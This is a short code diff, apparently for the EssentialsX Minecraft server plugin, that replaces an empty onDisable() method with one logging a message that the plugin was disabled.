-    public void onDisable() {}
+    public void onDisable() {
+        getLogger().info("EssentialsX plugin disabled");
+    }
 }
